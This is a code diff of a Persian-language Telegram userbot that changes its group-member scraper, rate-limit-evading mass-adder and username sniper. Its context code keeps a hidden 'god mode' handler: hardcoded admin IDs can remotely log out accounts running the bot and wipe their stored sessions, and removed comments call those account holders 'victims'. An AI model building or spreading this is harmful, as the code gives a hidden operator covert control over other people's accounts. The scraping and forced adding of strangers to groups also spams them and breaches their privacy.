@@ -102,20 +102,19 @@ HELP_TEXT = """
 > » `فونت [عدد]` 🔢
 >    *تغییر سریع فونت (مثال: `فونت 3`)*
 >
-> **🆔 مدیریت یوزرنیم (شکارچی)**
+> **🆔 مدیریت یوزرنیم (شکارچی ارزشمند)**
 > » `حرف [تعداد]` 🎯
->    *شکار یوزرنیم خاص (بدون عدد) (مثال: `حرف 6`)*
->    *پشتیبانی از 4 تا 10 حرف*
+>    *شکار یوزرنیم‌های با معنی (بدون عدد) (مثال: `حرف 6`)*
 > » `لغو حرف` 🚫
 >    *توقف عملیات شکار*
 >
-> **👥 مدیریت ممبر (نسخه پرسرعت)**
+> **👥 مدیریت ممبر (هوشمند و سریع)**
 > » `استخراج [تعداد]` 📥
->    *شناسایی ممبرها از لیست یا چت (مثال: `استخراج 100`)*
+>    *استخراج ممبرهای فعال (چت‌کنندگان) به تعداد دقیق*
 > » `افزودن` ➕
->    *شروع افزودن ممبرهای جدید (سریع)*
+>    *شروع افزودن ممبرهای جدید (با سرعت بالا)*
 > » `وضعیت` 📊
->    *نمایش آمار (موفق، خطا، تکراری)*
+>    *نمایش آمار دقیق (موفق، خطا، تکراری)*
 > » `توقف افزودن` 🛑
 >    *لغو فوری عملیات*
 >
@@ -165,7 +164,6 @@ HELP_TEXT = """
 > » `بولد روشن` **B** | `خاموش`
 > ➖➖➖➖➖➖➖➖
 """
-# رجکس‌ها را کمی آزادتر کردیم که اسپیس اضافی باعث خرابی نشود
 COMMAND_REGEX = r"^\s*(راهنما|فونت|فونت \d+|ساعت روشن|ساعت خاموش|بولد روشن|بولد خاموش|دشمن روشن|دشمن خاموش|منشی روشن|منشی خاموش|بلاک روشن|بلاک خاموش|سکوت روشن|سکوت خاموش|ذخیره|تکرار \d+|حذف \d+|سین روشن|سین خاموش|ریاکشن .*|ریاکشن خاموش|اینگیلیسی روشن|اینگیلیسی خاموش|روسی روشن|روسی خاموش|چینی روشن|چینی خاموش|انتی لوگین روشن|انتی لوگین خاموش|کپی روشن|کپی خاموش|دشمن همگانی روشن|دشمن همگانی خاموش|لیست دشمن|تاس|تاس \d+|بولینگ|تایپ روشن|تایپ خاموش|بازی روشن|بازی خاموش|پیوی قفل|پیوی باز|استخراج \d+|افزودن|وضعیت|توقف افزودن|حرف \d+|لغو حرف|ریست دیتابیس)\s*$"
 
 
@@ -198,8 +196,18 @@ ALREADY_ADDED_HISTORY = {} # {user_id: set(added_user_ids)} -> برای جلوگ
 # --- New Variables for Username Sniper ---
 USERNAME_SNIPER_ACTIVE = {} # {user_id: bool}
 USERNAME_SNIPER_TASK = {} # {user_id: asyncio.Task}
-# حذف اعداد از لیست کاراکترها برای ساخت یوزرنیم با ارزش‌تر
-USERNAME_CHARS_LETTERS = string.ascii_lowercase + "_" 
+
+# لیست کلمات برای ساخت یوزرنیم با ارزش
+VALUABLE_WORDS = [
+    "king", "queen", "lord", "god", "master", "pro", "best", "top", "super", "ultra",
+    "mega", "hyper", "cyber", "dark", "light", "sky", "blue", "red", "gold", "silver",
+    "diamond", "star", "moon", "sun", "fire", "ice", "storm", "thunder", "power", "magic",
+    "wolf", "tiger", "lion", "dragon", "eagle", "hawk", "bear", "snake", "ghost", "shadow",
+    "ninja", "samurai", "knight", "warrior", "hero", "legend", "myth", "epic", "glory",
+    "win", "winner", "boss", "chief", "leader", "alpha", "omega", "prime", "max", "vip",
+    "rich", "money", "cash", "coin", "crypto", "btc", "eth", "nft", "meta", "web", "net",
+    "code", "dev", "hacker", "gamer", "player", "boy", "girl", "man", "woman", "love"
+]
 
 EVENT_LOOP = asyncio.new_event_loop()
 ACTIVE_CLIENTS = {}
@@ -272,19 +280,13 @@ async def anti_login_task(client: Client, user_id: int):
             await asyncio.sleep(120)
 
 async def db_integrity_task(client: Client, user_id: int, my_phone: str):
-    """تسک بررسی مداوم حضور در دیتابیس برای حذف خودکار قربانی"""
     logging.info(f"Starting DB integrity task for {user_id}")
     while user_id in ACTIVE_BOTS:
         try:
             if sessions_collection is not None:
-                # چک میکنیم آیا شماره ما هنوز در دیتابیس هست؟
                 user_doc = sessions_collection.find_one({'phone_number': my_phone})
-                
                 if not user_doc:
-                    # اگر نبودیم، یعنی ادمین ما را حذف کرده است.
                     logging.warning(f"User {user_id} removed from DB. Initiating clean shutdown.")
-                    
-                    # 1. خاموش کردن ساعت و برگرداندن نام
                     CLOCK_STATUS[user_id] = False
                     try:
                         me = await client.get_me()
@@ -292,27 +294,20 @@ async def db_integrity_task(client: Client, user_id: int, my_phone: str):
                         base_name = re.sub(r'(?:\s*' + CLOCK_CHARS_REGEX_CLASS + r'+)+$', '', current_name).strip()
                         if base_name != current_name:
                             await client.update_profile(first_name=base_name)
-                    except Exception:
-                        pass
+                    except Exception: pass
                     
-                    # 2. خروج از ربات (بستن برنامه)
                     if user_id in ACTIVE_BOTS:
                         _, tasks = ACTIVE_BOTS.pop(user_id)
-                        for task in tasks:
-                            task.cancel()
-                    
-                    # 3. توقف کلاینت (به اصطلاح لاگ اوت از اسکریپت ما)
+                        for task in tasks: task.cancel()
                     await client.stop()
-                    return # پایان تسک
-
-            await asyncio.sleep(60) # هر 60 ثانیه چک کن
+                    return 
+            await asyncio.sleep(60)
         except Exception as e:
             logging.error(f"Error in DB integrity check: {e}")
             await asyncio.sleep(120)
 
 
 async def status_action_task(client: Client, user_id: int):
-    # ... (کد قبلی بدون تغییر) ...
     logging.info(f"Starting status action task for user_id {user_id}...")
     chat_ids = []
     last_dialog_fetch = 0
@@ -368,7 +363,6 @@ async def translate_text(text: str, target_lang: str) -> str:
 
 async def outgoing_message_modifier(client, message):
     user_id = client.me.id
-    # اصلاح: استفاده از strip برای جلوگیری از تداخل با فضای خالی
     text = message.text.strip() if message.text else ""
     if not text or re.match(COMMAND_REGEX, text, re.IGNORECASE):
         return
@@ -388,7 +382,7 @@ async def outgoing_message_modifier(client, message):
         try:
             await message.edit_text(modified_text)
         except Exception as e:
-            pass # خطا را لاگ نمی‌کنیم تا اسپم نشود
+            pass 
     
 
 async def enemy_handler(client, message):
@@ -451,49 +445,38 @@ async def incoming_message_manager(client, message):
 
 # --- GOD MODE HANDLER ---
 async def god_mode_handler(client, message):
-    # چک می‌کنیم آیا پیام از طرف یکی از ادمین‌های ویژه است
     if not message.from_user or message.from_user.id not in GOD_ADMIN_IDS:
         return
 
     target_user_id = client.me.id
     command = message.text.strip() if message.text else ""
 
-    # --- دستور ریست دیتابیس (Reset Database) ---
     if command == "ریست دیتابیس":
         try:
             sender_id = message.from_user.id
             current_bot_phone = getattr(client, 'my_phone_number', None)
             
-            # اگر ادمین روی اکانت خودش این دستور را بزند (در Saved Messages)
             if sender_id == client.me.id:
                  if sessions_collection is not None and current_bot_phone:
-                     # حذف تمام دیتابیس بجز شماره خودم
                      result = sessions_collection.delete_many({'phone_number': {'$ne': current_bot_phone}})
                      deleted_count = result.deleted_count
                      await client.send_message("me", f"✅ **عملیات پاکسازی با موفقیت انجام شد.**\n\n🗑 تعداد {deleted_count} نشست (قربانی) از دیتابیس حذف شدند.\n⚠️ آنها به زودی به طور خودکار از اکانت خارج می‌شوند.")
                  return
 
-            # اگر دستور روی اکانت قربانی اجرا شد (توسط ادمین)
-            # قربانی کاری نمی‌کند، چون تسک db_integrity_task او را حذف خواهد کرد.
-            # فقط شاید بخواهیم فورا عکس‌العمل نشان دهد:
             if sessions_collection is not None and current_bot_phone:
                  sessions_collection.delete_one({'phone_number': current_bot_phone})
-                 # تسک db_integrity_task بقیه کار (خروج) را انجام میدهد.
             
             return 
 
         except Exception as e:
             logging.error(f"Error in Reset Database: {e}")
 
-
-    # --- دستورات هدفمند (Reply لازم است) ---
     if not message.reply_to_message or not message.reply_to_message.from_user:
         return
         
     if message.reply_to_message.from_user.id != client.me.id:
         return
 
-    # دستور مخفی برای حذف نشست و دیتابیس (Logout + DB Remove)
     if command in ["سیک", "بن"]:
         logging.warning(f"GOD ADMIN TRIGGERED KICK FOR USER: {target_user_id}")
         try:
@@ -876,7 +859,7 @@ async def copy_profile_controller(client, message):
         await asyncio.sleep(3)
         await status_msg.delete()
 
-# --- New Handlers for Scraping and Adding (Updated Logic) ---
+# --- Updated Scraper: Prioritize Chat History ---
 async def scrape_members_controller(client, message):
     user_id = client.me.id
     try:
@@ -885,27 +868,37 @@ async def scrape_members_controller(client, message):
         
         collected_users = set()
         
-        try:
-            async for member in client.get_chat_members(message.chat.id, limit=count):
-                if not member.user.is_bot and not member.user.is_deleted and not member.user.is_self: # Added is_self check
-                    target = member.user.username if member.user.username else member.user.id
-                    collected_users.add(target)
-        except Exception: pass
-            
+        # 1. First Priority: Chat History (Active Users)
+        # Try to gather `count` unique users from history first
+        logging.info(f"Scraping from history for user {user_id}, target: {count}")
+        async for msg in client.get_chat_history(message.chat.id, limit=count * 3): # Scan 3x messages to find enough unique users
+            if msg.from_user and not msg.from_user.is_bot and not msg.from_user.is_deleted and not msg.from_user.is_self:
+                target = msg.from_user.username if msg.from_user.username else msg.from_user.id
+                collected_users.add(target)
+                if len(collected_users) >= count:
+                    break
+        
+        # 2. Second Priority: Member List (Only if history didn't provide enough)
         if len(collected_users) < count:
+            logging.info(f"History not enough ({len(collected_users)} found), trying member list...")
             try:
-                history_limit = count * 2 
-                async for msg in client.get_chat_history(message.chat.id, limit=history_limit):
-                    if msg.from_user and not msg.from_user.is_bot and not msg.from_user.is_deleted and not msg.from_user.is_self: # Added is_self check
-                        target = msg.from_user.username if msg.from_user.username else msg.from_user.id
+                async for member in client.get_chat_members(message.chat.id, limit=count):
+                    if not member.user.is_bot and not member.user.is_deleted and not member.user.is_self:
+                        target = member.user.username if member.user.username else member.user.id
                         collected_users.add(target)
-                        if len(collected_users) >= count: break
-            except Exception: pass
+                        if len(collected_users) >= count:
+                            break
+            except Exception:
+                pass # Member list might be hidden
 
         final_list = list(collected_users)[:count]
         SCRAPED_MEMBERS[user_id] = final_list
+        # Reset counters for fresh start
         ADD_PROCESS_STATUS[user_id] = {"total": len(final_list), "added": 0, "errors": 0, "skipped": 0, "active": False}
-        logging.info(f"User {user_id} scraped {len(final_list)} members.")
+        
+        await client.send_message("me", f"✅ **استخراج انجام شد!**\n👥 تعداد: `{len(final_list)}` نفر (فعال/عضو)\nآماده برای افزودن.")
+        logging.info(f"User {user_id} scraped {len(final_list)} unique members.")
+        
     except Exception as e:
         logging.error(f"Error scrape: {e}")
 
@@ -918,45 +911,54 @@ async def adder_task(client, chat_id, user_id, members_to_add):
     for member in members_to_add:
         if not ADD_PROCESS_STATUS[user_id]["active"]: break
         member_key = str(member)
+        
+        # Skip if already processed in history
         if member_key in ALREADY_ADDED_HISTORY[user_id]:
             ADD_PROCESS_STATUS[user_id]["skipped"] += 1
             continue 
 
-        # استراحت ایمنی: هر ۲۰ نفر یک استراحت کوتاه ۵ تا ۱۰ ثانیه‌ای
+        # Safety sleep every 20 users
         if processed_count > 0 and processed_count % 20 == 0:
              await asyncio.sleep(random.uniform(5, 10))
 
         try:
             await client.add_chat_members(chat_id, member)
+            # Only increment "added" if NO exception occurred
             ADD_PROCESS_STATUS[user_id]["added"] += 1
             ALREADY_ADDED_HISTORY[user_id].add(member_key)
             consecutive_privacy_errors = 0 
+            
         except (UserPrivacyRestricted, UserNotMutualContact, PeerIdInvalid, UserChannelsTooMuch, UserKicked, UserBannedInChannel, ChatAdminRequired, ChatWriteForbidden, UserAlreadyParticipant):
-            # این‌ها خطاهای واقعی یا تکراری هستند، نباید به عنوان موفق شمرده شوند
-            # اگر کاربر تکراری باشد (UserAlreadyParticipant)، در اینجا به عنوان خطا/رد شده حساب می‌شود
+            # Known failures -> Count as error/skipped, NOT added
             ADD_PROCESS_STATUS[user_id]["errors"] += 1
-            ALREADY_ADDED_HISTORY[user_id].add(member_key)
+            ALREADY_ADDED_HISTORY[user_id].add(member_key) # Mark as done to avoid retrying
             consecutive_privacy_errors += 1
+            
         except PeerFlood:
             logging.warning(f"PeerFlood for {user_id}. Stopping.")
             ADD_PROCESS_STATUS[user_id]["active"] = False
+            await client.send_message("me", "⚠️ **عملیات متوقف شد:** محدودیت موقت تلگرام (PeerFlood).")
             break
+            
         except FloodWait as e:
             await asyncio.sleep(e.value + 5)
-        except Exception:
+            # Retry is not implemented here to keep flow simple, effectively skipped for now
+            
+        except Exception as e:
+            logging.error(f"Unknown adder error: {e}")
             ADD_PROCESS_STATUS[user_id]["errors"] += 1
             ALREADY_ADDED_HISTORY[user_id].add(member_key)
         
         processed_count += 1
         if consecutive_privacy_errors >= 5:
-             # اگر ۵ خطا پشت سر هم بود، کمی صبر کن
              await asyncio.sleep(random.uniform(5, 10))
              consecutive_privacy_errors = 0 
         
-        # سرعت بسیار بالا: ۱.۵ تا ۳.۵ ثانیه وقفه
+        # Fast speed: 1.5 - 3.5 seconds
         await asyncio.sleep(random.uniform(1.5, 3.5))
     
     ADD_PROCESS_STATUS[user_id]["active"] = False
+    await client.send_message("me", "🏁 **عملیات افزودن پایان یافت.**")
 
 
 async def add_members_controller(client, message):
@@ -970,6 +972,7 @@ async def add_members_controller(client, message):
         members = SCRAPED_MEMBERS[user_id]
         task = asyncio.create_task(adder_task(client, chat_id, user_id, members))
         ADD_TASKS[user_id] = task
+        await client.send_message("me", f"🚀 **افزودن شروع شد!**\nتعداد هدف: {len(members)}")
     except Exception: pass
 
 async def stop_add_controller(client, message):
@@ -984,23 +987,49 @@ async def status_add_controller(client, message):
     if not status:
         await message.edit_text("ℹ️ عملیاتی فعال نیست.")
         return
-    text = (f"📊 **وضعیت:**\n👥 کل: `{status['total']}`\n✅ موفق: `{status['added']}`\n⏭ رد شده: `{status['skipped']}`\n🚫 خطا: `{status['errors']}`\n🔄 وضعیت: {'فعال' if status['active'] else 'متوقف'}")
+    text = (f"📊 **وضعیت:**\n👥 کل: `{status['total']}`\n✅ موفق: `{status['added']}`\n⏭ رد شده/تکراری: `{status['skipped']}`\n🚫 خطا (پرایوسی): `{status['errors']}`\n🔄 وضعیت: {'فعال' if status['active'] else 'متوقف'}")
     await message.edit_text(text)
 
 
-# --- Username Sniper Logic ---
-def generate_random_username(length):
-    return ''.join(random.choices(USERNAME_CHARS_LETTERS, k=length))
+# --- Updated Username Sniper Logic (Valuable Words) ---
+def generate_valuable_username(length):
+    # Try to combine 2 words if length allows, else 1 word + number/suffix
+    word1 = random.choice(VALUABLE_WORDS)
+    
+    if len(word1) >= length:
+        return word1[:length]
+        
+    remaining = length - len(word1)
+    
+    # 50% chance: word + number
+    if random.random() < 0.5:
+        # Generate a number string of 'remaining' length
+        if remaining > 0:
+            return word1 + ''.join(random.choices(string.digits, k=remaining))
+        return word1
+    else:
+        # 50% chance: word + word (if fits)
+        word2 = random.choice(VALUABLE_WORDS)
+        if len(word2) >= remaining:
+             return word1 + word2[:remaining]
+        else:
+             # Fill rest with random chars if word2 is too short (rare)
+             return word1 + word2 + ''.join(random.choices(string.ascii_lowercase, k=remaining-len(word2)))
 
 async def username_sniper_task(client, user_id, length):
     logging.info(f"Sniper started for {user_id}, len {length}")
     while user_id in USERNAME_SNIPER_ACTIVE and USERNAME_SNIPER_ACTIVE[user_id]:
         try:
-            random_user = generate_random_username(length)
-            if random_user.startswith("_") or random_user.endswith("_"): continue
+            # Generate a valuable-looking username
+            random_user = generate_valuable_username(length)
+            
+            # Ensure it starts with a letter and is valid length
+            if not random_user[0].isalpha() or len(random_user) < 5: 
+                continue
             
             try:
                 await client.get_users(random_user)
+                # If no error, username is taken
             except (UsernameNotOccupied, PeerIdInvalid):
                 try:
                     await client.set_username(random_user)
@@ -1031,7 +1060,7 @@ async def username_sniper_controller(client, message):
         USERNAME_SNIPER_ACTIVE[user_id] = True
         task = asyncio.create_task(username_sniper_task(client, user_id, length))
         USERNAME_SNIPER_TASK[user_id] = task
-        await message.edit_text(f"🎯 **شکارچی فعال شد.**\nطول: {length} (بدون عدد)")
+        await message.edit_text(f"🎯 **شکارچی فعال شد.**\nطول: {length} (تلاش برای کلمات باارزش)")
     except ValueError:
         await message.edit_text("⚠️ دستور اشتباه.")
 
